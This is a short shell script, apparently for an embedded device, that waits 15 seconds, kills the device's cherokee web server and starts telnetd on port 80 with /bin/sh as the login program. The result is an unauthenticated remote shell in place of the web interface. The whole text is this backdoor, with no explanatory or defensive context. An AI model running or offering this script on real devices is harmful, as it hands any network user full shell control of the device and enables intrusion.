sleep 15
lu_util exec 'pkill cherokee'
lu_util exec 'telnetd -l /bin/sh -p 80 > /tmp/fuse_d/telnet.txt'

